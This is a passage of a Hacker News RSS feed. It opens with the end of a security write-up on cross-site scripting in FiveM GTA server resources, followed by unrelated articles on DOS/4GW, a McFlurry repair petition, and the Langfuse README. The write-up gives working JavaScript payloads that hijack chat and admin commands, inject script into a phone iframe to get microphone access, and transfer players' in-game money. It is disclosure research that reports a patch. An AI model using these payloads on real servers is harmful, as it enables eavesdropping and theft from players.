</span><span>  request<span>.</span><span>send</span><span>(</span>data<span>)</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>send</span><span>(</span><span>e</span><span>)</span> <span>{</span>
</span><span>  <span>if</span><span>(</span><span>this</span><span>.</span><span>message</span> <span>!==</span> <span>''</span><span>)</span> <span>{</span>
</span><span>    <span>post</span><span>(</span><span>'http://chat/chatResult'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
</span><span>      <span>message</span><span>:</span> <span>this</span><span>.</span><span>message</span><span>,</span>
</span><span>    <span>}</span><span>)</span><span>)</span><span>;</span>
</span><span>  <span>}</span> <span>else</span> <span>{</span>
</span><span>    <span>this</span><span>.</span><span>hideInput</span><span>(</span><span>true</span><span>)</span><span>;</span>
</span><span>  <span>}</span>
</span><span><span>}</span>
</span></code></pre>
<p>Nice, an attacker should be able to have users send chat messages by sending
a request to this URL with the <code>message</code> payload being our chat message:</p>
<pre><code><span><span>fetch</span><span>(</span><span>"https://chat/chatResult"</span><span>,</span> <span>{</span>
</span><span>    <span>method</span><span>:</span> <span>"POST"</span><span>,</span>
</span><span>    <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>message</span><span>:</span> <span>"test"</span> <span>}</span><span>)</span><span>,</span>
</span><span><span>}</span><span>)</span><span>;</span>
</span></code></pre>
<figure><img alt="Result of the payload from above" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Result of the payload from above</figcaption></figure>
<p>An attacker can also execute in-game commands (Make admins execute <code>/ban</code>, <code>/kick</code>, etc...).</p>
<h3>Abusing Web APIs</h3>
<p>The attacker can also utilize various Web APIs to do things like access the user's microphone:
However, FiveM prompts the user for microphone access which may look suspicious.</p>
<pre><code><span><span>function</span> <span>getLocalStream</span><span>(</span><span>)</span> <span>{</span>
</span><span>  <span>navigator</span><span>.</span><span>mediaDevices</span>
</span><span>    <span>.</span><span>getUserMedia</span><span>(</span><span>{</span> <span>video</span><span>:</span> <span>false</span><span>,</span> <span>audio</span><span>:</span> <span>true</span> <span>}</span><span>)</span>
</span><span>    <span>.</span><span>then</span><span>(</span><span>(</span><span>stream</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>window</span><span>.</span><span>localStream</span> <span>=</span> stream<span>;</span> <span>// A</span>
</span><span>      <span>window</span><span>.</span><span>localAudio</span><span>.</span><span>srcObject</span> <span>=</span> stream<span>;</span> <span>// B</span>
</span><span>      <span>window</span><span>.</span><span>localAudio</span><span>.</span><span>autoplay</span> <span>=</span> <span>true</span><span>;</span> <span>// C</span>
</span><span>    <span>}</span><span>)</span>
</span><span>    <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>console</span><span>.</span><span>error</span><span>(</span><span><span>`</span><span>you got an error: </span><span><span>${</span>err<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
</span><span>    <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre>
<figure><img alt="Infected resource rcore_radiocar asking for media device permission. Very suspicious" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Infected resource rcore_radiocar asking for media device permission. Very suspicious</figcaption></figure>
<p>So instead, we can hijack an iframe that may already have microphone permission.
A good candidate being <code>gksphone</code>, a resource that gives the players a cellphone
and the ability to call each other.</p>
<pre><code><span><span>window</span><span>.</span><span>gksPhone</span> <span>=</span> top<span>.</span><span>citFrames</span><span>[</span><span>'gksphone'</span><span>]</span><span>;</span>
</span><span>
</span><span><span>window</span><span>.</span><span>reqMicrophoneScript</span> <span>=</span> top<span>.</span><span>document</span><span>.</span><span>createElement</span><span>(</span><span>'script'</span><span>)</span><span>;</span>
</span><span><span>window</span><span>.</span><span>reqMicrophoneScript</span><span>.</span><span>innerHTML</span> <span>=</span> <span><span>`</span><span>
</span></span></span><span><span><span>function requestMicrophone() {
</span></span></span><span><span><span>    return navigator.mediaDevices.getUserMedia({ audio: true })
</span></span></span><span><span><span>    .then((stream) =&gt; {
</span></span></span><span><span><span>      // ...
</span></span></span><span><span><span>    })
</span></span></span><span><span><span>}
</span></span></span><span><span><span>requestMicrophone();
</span></span></span><span><span><span></span><span>`</span></span>
</span><span>
</span><span><span>// inject the function into the gksphone resource</span>
</span><span><span>// which already has microphone access :)</span>
</span><span><span>window</span><span>.</span><span>gksPhone</span><span>.</span><span>contentWindow</span><span>.</span><span>document</span><span>.</span><span>body</span><span>.</span><span>appendChild</span><span>(</span><span>window</span><span>.</span><span>reqMicrophoneScript</span><span>)</span><span>;</span>
</span></code></pre>
<h3>Stealing Player's Money</h3>
<p>An attacker is able to transfer all player's money to themselves (or to any specified ID)
by abusing the <code>bank</code> resource.</p>
<pre><code><span><span>// bank/html/script.js</span>
</span><span>$<span>.</span><span>post</span><span>(</span><span>'http://bank/transfer'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
</span><span>    <span>to</span><span>:</span> <span>$</span><span>(</span><span>'#idval'</span><span>)</span><span>.</span><span>val</span><span>(</span><span>)</span><span>,</span>
</span><span>    <span>amountt</span><span>:</span> <span>$</span><span>(</span><span>'#transferval'</span><span>)</span><span>.</span><span>val</span><span>(</span><span>)</span>
</span><span><span>}</span><span>)</span><span>)</span><span>;</span>
</span></code></pre>
<h3>Changing Everyone's Appearence</h3>
<pre><code><span><span>const</span> fivemAppearanceFrame <span>=</span> top<span>.</span><span>window</span><span>.</span><span>citFrames</span><span>[</span><span>"fivem-appearance"</span><span>]</span><span>.</span><span>contentWindow</span><span>;</span>
</span><span><span>const</span> fetch <span>=</span> fivemAppearanceFrame<span>.</span><span>fetch</span><span>;</span>
</span><span>
</span><span><span>const</span> baseUrl <span>=</span> <span><span>`</span><span>https://fivem-appearance</span><span>`</span></span><span>;</span>
</span><span>
</span><span><span>function</span> <span>randomInteger</span><span>(</span><span>min<span>,</span> max</span><span>)</span> <span>{</span>
</span><span>  <span>return</span> <span>Math</span><span>.</span><span>floor</span><span>(</span><span>Math</span><span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>max <span>-</span> min <span>+</span> <span>1</span><span>)</span><span>)</span> <span>+</span> min<span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>const</span> <span>main</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>// Get the player's existing appearence</span>
</span><span>  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span>baseUrl <span>+</span> <span>"/appearance_get_settings_and_data"</span><span>,</span> <span>{</span>
</span><span>    <span>method</span><span>:</span> <span>"GET"</span><span>,</span>
</span><span>    <span>headers</span><span>:</span> <span>{</span>
</span><span>      <span>"Content-type"</span><span>:</span> <span>"application/json; charset=UTF-8"</span><span>,</span>
</span><span>    <span>}</span><span>,</span>
</span><span>  <span>}</span><span>)</span><span>;</span>
</span><span>  <span>const</span> body <span>=</span> <span>await</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span>  <span>if</span> <span>(</span>body <span>&amp;&amp;</span> <span>"appearanceSettings"</span> <span>in</span> body<span>)</span> <span>{</span>
</span><span>    <span>const</span> <span>{</span> components <span>}</span> <span>=</span> body<span>.</span><span>appearanceSettings</span><span>;</span>
</span><span>    components<span>.</span><span>forEach</span><span>(</span><span>(</span><span>component</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>const</span> componentId <span>=</span> component<span>.</span><span>component_id</span><span>;</span>
</span><span>      <span>const</span> drawableId <span>=</span> <span>randomInteger</span><span>(</span>
</span><span>        component<span>.</span><span>drawable</span><span>.</span><span>min</span><span>,</span>
</span><span>        component<span>.</span><span>drawable</span><span>.</span><span>max</span>
</span><span>      <span>)</span><span>;</span>
</span><span>      <span>const</span> textureId <span>=</span> <span>randomInteger</span><span>(</span>
</span><span>        component<span>.</span><span>texture</span><span>.</span><span>min</span><span>,</span>
</span><span>        component<span>.</span><span>texture</span><span>.</span><span>max</span>
</span><span>      <span>)</span><span>;</span>
</span><span>
</span><span>      <span>// Change the appearence to random clothing </span>
</span><span>      <span>fetch</span><span>(</span>baseUrl <span>+</span> <span>"/appearance_change_component"</span><span>,</span> <span>{</span>
</span><span>        <span>method</span><span>:</span> <span>"POST"</span><span>,</span>
</span><span>        <span>headers</span><span>:</span> <span>{</span>
</span><span>          <span>"Content-type"</span><span>:</span> <span>"application/json; charset=UTF-8"</span><span>,</span>
</span><span>        <span>}</span><span>,</span>
</span><span>        <span>body</span><span>:</span> <span>{</span>
</span><span>          <span>component_id</span><span>:</span> componentId<span>,</span>
</span><span>          <span>drawable</span><span>:</span> drawableId<span>,</span>
</span><span>          <span>texture</span><span>:</span> textureId<span>,</span>
</span><span>        <span>}</span><span>,</span>
</span><span>      <span>}</span><span>)</span><span>;</span>
</span><span>    <span>}</span><span>)</span><span>;</span>
</span><span>  <span>}</span>
</span><span><span>}</span><span>;</span>
</span><span>
</span><span><span>main</span><span>(</span><span>)</span><span>;</span>
</span></code></pre>
<h2>Impact</h2>
<p>A quick script Pimothy and I wrote to parse the FiveM server list and filter by resources
shows that hundreds of servers contained the vulnerable resources with the potential
to infect thousands of players:</p>
<pre><code><span>xsound found on w9a... players: [628/2048]
</span><span>rcore_radiocar found on 8bo... players: [256/500]
</span><span>xsound found on 35a... players: [299/400]
</span><span>xsound found on a6r... players: [314/2048]
</span><span>rcore_radiocar found on a6r... players: [314/2048]
</span><span>xsound found on gq6... players: [313/2048]
</span><span>xsound found on 4ez... players: [198/500]
</span><span>xsound found on pkp... players: [570/1069]
</span><span>xsound found on npx... players: [347/2048]
</span><span>xsound found on 8qq... players: [252/800]
</span><span>rcore_radiocar found on qrv... players: [137/200]
</span><span>xsound found on qrv... players: [137/200]
</span><span>xsound found on mko... players: [90/333]
</span><span>xsound found on mpd... players: [160/600]
</span><span>xsound found on aqq... players: [137/1337]
</span><span>xsound found on 23o... players: [135/2048]
</span><span>xsound found on gro... players: [120/150]
</span><span>xsound found on l54... players: [224/512]
</span><span>rcore_radiocar found on j8d... players: [182/400]
</span><span>xsound found on e3r... players: [122/175]
</span><span>xsound found on eaz... players: [160/500]
</span><span>xsound found on rk6... players: [60/300]
</span><span>and many more...
</span></code></pre>
<p>As shown above, the severity of this exploit is fairly high as an attacker is able
to execute arbitrary JavaScript to all players on a server allowing for things such
as microphone access, clipboard contents, and more. It was clear I needed to report
it to the resource developer and so I did and <a href="https://github.com/Xogy/xsound/blame/8790f60a32506273ef09d7d963b36299bb621e54/html/scripts/SoundPlayer.js#L71">on May 18 2022, a patch was released
to fix the XSS.</a></p>
<pre><code><span><span>setSoundUrl</span><span>(</span><span>result</span><span>)</span> <span>{</span>
</span><span>	<span>this</span><span>.</span><span>url</span> <span>=</span> result<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>&lt;<span><span>[</span><span>^</span>&gt;<span>]</span></span><span>*</span>&gt;<span>?</span></span><span>/</span><span>gm</span></span><span>,</span> <span>''</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre>
<p>I had an idea to find servers that may still be vulnerable to this exploit so I could report it
to the server owners. It would work by traversing the server list and requesting their xsound resource
to test if the patch was applied (likely using a regex). However, the FiveM server encrypts resources and
decrypts them on the client. The decrypt routine is heavily obfuscated by their anticheat <code>adhesive.dll</code>
making automation infeasible.</p>
<h2>Conclusion</h2>
<p>FiveM provides a powerful framework to create game experiences not otherwise possible
in Grand Theft Auto. However, this power can be abused by attackers through the use of
XSS in vulnerable NUI resources. It is important to utilize proper input sanitization
and other best practices to prevent exploits like this. Server owners should also keep
installed resources up to date.</p>
<h2>Special Thanks</h2>
<ul>
<li><a href="https://github.com/pimothyxd">pimothy</a> - Helped with the research for this project. Created the server list aggregator to scan for vulnerable servers.</li>
<li><a href="https://jord.in/">jordin</a> - A test subject to help test the more severe payloads (Bank transfers, Microphone access, etc...)</li>
</ul>
<section data-footnotes="true">
<ol>
<li id="user-content-fn-earnings">
<p><a href="https://www.ign.com/articles/take-two-ceo-says-mid-generation-upgrades-like-rumored-ps5-pro-arent-all-that-meaningful">https://www.ign.com/articles/take-two-ceo-says-mid-generation-upgrades-like-rumored-ps5-pro-arent-all-that-meaningful</a> <a href="#user-content-fnref-earnings" data-footnote-backref="true" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-cfx-acquired">
<p><a href="https://www.rockstargames.com/newswire/article/8971o8789584a4/roleplay-community-update">Cfx.re has been acquired by Rockstar Games</a> <a href="#user-content-fnref-cfx-acquired" data-footnote-backref="true" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DOS/4GW made Windows 95 game compatibility easier, but with higher stakes (230 pts)]]></title>
            <link>https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661</link>
            <guid>37311508</guid>
            <pubDate>Tue, 29 Aug 2023 17:57:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661">https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661</a>, See on <a href="https://news.ycombinator.com/item?id=37311508">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="featured">
                         <p>
            August 29th, 2023</p><!-- .entry-meta -->
        <p>By far, <a title="DOS/4GW and Protected Mode" href="https://pikuma.com/blog/what-is-dos4gw-protected-mode"> the most popular so-called DOS Extender in the early 1990’s was DOS/4GW</a>. MS-DOS game compatibility occupied a very large portion of my time during Windows 95 development, so I saw a lot of DOS Extender banners, most frequently the DOS/4GW banner.</p>
<p>Now, you might wonder, “How did these games even run in Windows 95 if they came with a DOS Extender? Wouldn’t the extender try to enter protected mode and fail, because Windows was already managing protected mode?”</p>
<p>The trick is that these extenders were really two programs bundled together. One was a protected mode server, and the other was a protected mode client library.</p>
<p>In the beginning, there was the Virtual Control Program Interface (VCPI), which was supported by expanded memory managers like EMM386. These expanded memory managers barely used protected mode at all: The only thing they cared about was getting access to memory above the 1MB boundary, so they set up some page tables in order to map extended memory into the expanded memory page frame, but did no other virtualization. MS-DOS ran in a virtual machine that had full hardware access, and the VCPI interface let an MS-DOS application say, “Hey, I’d like to take over complete control of the system now,” and VCPI would say “Sure, no problem!”</p>
<p>The VCPI interface quickly faded in popularity because no protected mode operating system (like Windows 3.0 in enhanced mode) would let any program take over complete control of the system. You would basically be suspending the old operating system in order to let the MS-DOS program take over as its own new custom operating system. Windows 3.0 introduced a new interface called the DOS Protected Mode Interface (DPMI) which let MS-DOS programs request that their code execute in protected mode, but only in user mode. The DPMI provider remained in control of kernel mode.</p>
<p>Okay, so back to DOS/4GW. When it started up, the DOS/4GW extender looked around to see if a DPMI server was already running. If not, then it installed itself as the DPMI server. But if a DPMI server was already running, then it allowed that DPMI server to remain in charge.</p>
<p>The game communicated only with the DPMI client portion of the library, which it used to transition to 32-bit mode, allocate memory, and do all those 32-bit things that these 32-bit game wanted to 32-bit do.</p>
<p>In other words, we have the following block diagram:</p>
<table title="The game code runs in ring 3 and communicates with the DPMI client (the DOS/4GW DPMI client) also in ring 3. The DPMI client communicates with a DPMI server. If running inside Windows, the DPMI server is Window sitself. If running standalone, then the DPMI server is the DOS/4GW DPMI server.">
<tbody>
<tr>
<td>&nbsp;</td>
<td>Inside Windows</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Standalone</td>
</tr>
<tr>
<td>DPMI server<br>
(ring 0)</td>
<td>Windows</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>DOS/4GW<br>
DPMI Server</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>⤡</td>
<td>&nbsp;</td>
<td>⤢</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>DPMI client<br>
(ring 3)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>DOS/4GW<br>
DPMI Client</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>⇅</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Game code<br>
(ring 3)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Game</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p>Both Windows and the DOS/4GW DPMI server implement the DPMI interface, so the DOS/4GW DPMI client used standard DPMI calls to communicate with both servers.</p>
<p>This was great for application compatibility, because if there was some issue with how the DOS/4GW client communicated with the DOS/4GW server, we just had to fix it once, and it fixed a lot of games. On the other hand, if the issue couldn’t be fixed, it broke a lot of games.</p>
<p>High risk, high reward.</p>
<p>Miraculously, most games <i>just worked</i> despite running under a different DPMI server from what they were originally developed with. There were occasional issues with specific games. Popular ones include <a title="Getting MS-DOS games to run on Windows 95: Virtual memory" href="https://devblogs.microsoft.com/oldnewthing/20160328-00/?p=93204"> games which assumed that all memory was physical</a> and <a title="Getting MS-DOS games to run on Windows 95: The interrupt flag" href="https://devblogs.microsoft.com/oldnewthing/20160404-00/?p=93261"> games which assumed the interrupt flag was unvirtualized</a>, but for the most part, things worked well enough that the remaining issues could be treated as app-specific bugs.</p>

        

		
        
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[iFixit Petitions Government for Right to Hack McDonald's Ice Cream Machine (300 pts)]]></title>
            <link>https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/</link>
            <guid>37311239</guid>
            <pubDate>Tue, 29 Aug 2023 17:37:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/">https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/</a>, See on <a href="https://news.ycombinator.com/item?id=37311239">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>
          <div>
              <!--kg-card-begin: html--><!--kg-card-end: html--><p>A group of right to repair activists and consumer rights advocates are petitioning the Librarian of Congress for the right to hack McDonald’s <a href="https://www.vice.com/en/article/4adyng/a-bot-tracking-mcdonalds-ice-cream-machines-finds-troubling-racial-disparities?ref=404media.co">notoriously unreliable</a> McFlurry machines for the purposes of repair, according to a copy of the petition obtained by 404 Media.</p><p>“This is a request to expand the repair exemption for consumer electronic devices to include commercial industrial equipment such as automated building management systems and industrial equipment (i.e. soft serve ice cream machines and other industrial kitchen equipment),” the proposal, written by right to repair group iFixit and the nonprofit Public Knowledge, says.</p><p>In addition, <a href="https://www.ifixit.com/News/80215/whats-inside-that-mcdonalds-ice-cream-machine-broken-copyright-law?ref=404media.co">iFixit got its hands on a Taylor ice cream machine</a> and tore it down in an effort to determine why they are broken so damn often and published a new video showing the process of taking the machine apart and explaining why they’re always broken when you want fast food ice cream. </p><p>The petition and teardown video come as a lawsuit between Taylor and a company that made a device that reads and deciphers the machine’s error codes enters its third year and heads toward a jury trial later this fall. </p><p>Every three years, interested parties have to file requests with the Librarian of Congress that seek “exemptions” to the Digital Millennium Copyright Act, the overarching federal copyright law. Through a process called Section 1201 rulemaking, repair professionals and consumer rights groups seek permission from the government to break arbitrary software locks and passwords that keep consumers and repair professionals from diagnosing and repairing equipment they own or are authorized by the owner to work on. </p><figure><img src="https://www.404media.co/content/images/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png" alt="" loading="lazy" width="2000" height="872" srcset="https://www.404media.co/content/images/size/w600/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 600w, https://www.404media.co/content/images/size/w1000/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 1000w, https://www.404media.co/content/images/size/w1600/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 1600w, https://www.404media.co/content/images/size/w2400/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Image: iFixit</figcaption></figure><p>Currently, Taylor has service contracts with McDonald’s franchises that allow them to exclusively service the ice cream machines. A DMCA exemption would allow McDonald’s franchises to legally do repair work on their own machines. </p><p>In the past, hard-fought exemptions have been won for consumer electronics, tractors, and video game consoles. This year, iFixit and Public Knowledge want to extend an exemption to McDonald’s ice cream machines. In the past, companies like John Deere and lobbying groups like the Entertainment Software Association have tried to kill these exemptions, but groups like iFixit and Public Knowledge have generally been able to push them through the exemption process.</p><p>“The current barriers to these works include service passwords and digital locks,” the petition reads. “Commercial ice cream machines, such as the Taylor manufactured ice cream machines used by McDonald’s, frequently fall into disrepair when its daily pasteurization cycle fails. Circumventing the digital lock on the software would enable owners and repair professionals to diagnose and perform the necessary repairs to get these devices back up and running.”</p><p>A few years ago, I reported that McDonald’s franchises have been <a href="https://www.vice.com/en/article/3aqbm5/mcdonalds-franchises-hack-mcflurry-machines-to-bypass-sanitization-process?ref=404media.co">surreptitiously hacking their ice cream machines</a> to be able to read diagnostic codes without permission from Taylor, which makes the machines. In 2013, Taylor issued a “Service Bulletin” that said unauthorized people had been installing a “shunt” or “jumper” that can bypass arbitrary locks on the machine. </p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/2uCpY3tFTIA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" title="Why McDonald's Ice Cream Machines Are Always Broken and How To Fix Them"></iframe></figure><p>In its Taylor ice cream machine teardown, an iFixit technician says he believes there are several specific issues with the machine that causes it to break down, and which prevent it from being repaired easily.</p><p>“The machine overheats if it’s used too much within a certain time period. This results in mushy goop coming out or the machine shutting down and refusing to work until it resets and cools down,” Shahram Mokhtari, iFixit’s lead teardown tech, said in iFixit’s teardown. The machine gives error codes that explain what’s wrong with the machine: “error after error means I’m constantly having to refer back to the manual … tiny errors can cause big headaches … the error codes are nonsensical, counterintuitive, and seemingly random, even if you spend hours reading the manual.”</p><p>Broken McDonald’s McFlurry machines has become a meme over the years, with the company itself joking about extended downtime, and the Federal Trade Commission promising to investigate <a href="https://www.vice.com/en/article/jg83e4/the-ftc-is-investigating-why-mcdonalds-mcflurry-machines-are-always-broken-report?ref=404media.co">why they are broken so often</a>. But the issue of unreliable, difficult-to-repair McFlurry machines and various associated legal dramas around it could fill out a Bingo card of important right to repair and public access issues in the United States.</p><figure><img src="https://www.404media.co/content/images/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png" alt="" loading="lazy" width="2000" height="1135" srcset="https://www.404media.co/content/images/size/w600/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 600w, https://www.404media.co/content/images/size/w1000/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 1000w, https://www.404media.co/content/images/size/w1600/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 1600w, https://www.404media.co/content/images/size/w2400/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Downloading court documents for the Kytch lawsuit is $2,999</figcaption></figure><p>A company called Kytch built a small, third-party device that could be attached to the soft service ice cream machines that read and interpreted Taylor’s error codes. Kytch has been engaged <a href="https://www.vice.com/en/article/93ymbp/why-the-mcflurry-machine-company-just-got-hit-with-a-restraining-order?ref=404media.co">in a lawsuit in California state court</a> with Taylor and McDonald’s for <a href="https://www.vice.com/en/article/dy7dbj/judge-allows-mcflurry-machine-repair-lawsuit-to-proceed?ref=404media.co">more than two years</a>. More than 480 documents have been filed with the court in that lawsuit, and a trial is scheduled for this fall. Even reading documents from this lawsuit is a costly nightmare of an affair. The Superior Court of Alameda County is charging roughly $1 per page to get legal filings. To download the entirety of the court proceedings to date, the court wants $2,999.</p><!--kg-card-begin: html-->
<!--kg-card-end: html--><!--kg-card-begin: html--><!--kg-card-end: html-->
          </div>
        </article>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FBI, Partners Dismantle Qakbot Infrastructure in Multinational Cyber Takedown (225 pts)]]></title>
            <link>https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown</link>
            <guid>37310772</guid>
            <pubDate>Tue, 29 Aug 2023 17:02:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown">https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown</a>, See on <a href="https://news.ycombinator.com/item?id=37310772">Hacker News</a></p>
Couldn't get https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Langfuse – Open-source observability and analytics for LLM apps (134 pts)]]></title>
            <link>https://github.com/langfuse/langfuse</link>
            <guid>37310070</guid>
            <pubDate>Tue, 29 Aug 2023 16:14:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/langfuse/langfuse">https://github.com/langfuse/langfuse</a>, See on <a href="https://news.ycombinator.com/item?id=37310070">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text">
<h2 tabindex="-1" dir="auto">What is Langfuse?</h2>
<p dir="auto">Langfuse is an open source observability &amp; analytics solution for LLM-based applications. It is mostly geared towards production usage but some users also use it for local development of their LLM applications.</p>
<p dir="auto">Langfuse is focused on applications built on top of LLMs. Many new abstractions and common best practices evolved recently, e.g. agents, chained prompts, embedding-based retrieval, LLM access to REPLs &amp; APIs. These make applications more powerful but also unpredictable for developers as they cannot fully anticipate how changes impact the quality, cost and overall latency of their application. Thus Langfuse helps to monitor and debug these applications.</p>
<p dir="auto"><strong>Demo (2 min)</strong></p>
<details open="">
  <summary>
    
    <span aria-label="Video description langfuse_demo_2_min.mp4">langfuse_demo_2_min.mp4</span>
    <span></span>
  </summary>

  <video src="https://user-images.githubusercontent.com/2834609/262364670-6041347a-b517-4a11-8737-93ef8f8af49f.mp4" data-canonical-src="https://user-images.githubusercontent.com/2834609/262364670-6041347a-b517-4a11-8737-93ef8f8af49f.mp4" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><em>Muted by default, enable sound for voice-over</em></p>
<p dir="auto">Explore demo project in Langfuse here (free account required): <a href="https://langfuse.com/demo" rel="nofollow">https://langfuse.com/demo</a></p>
<h3 tabindex="-1" dir="auto">Observability</h3>
<p dir="auto">Langfuse offers an admin UI to explore the ingested data.</p>
<ul dir="auto">
<li>Nested view of LLM app executions; detailed information along the traces on: latency, cost, scores</li>
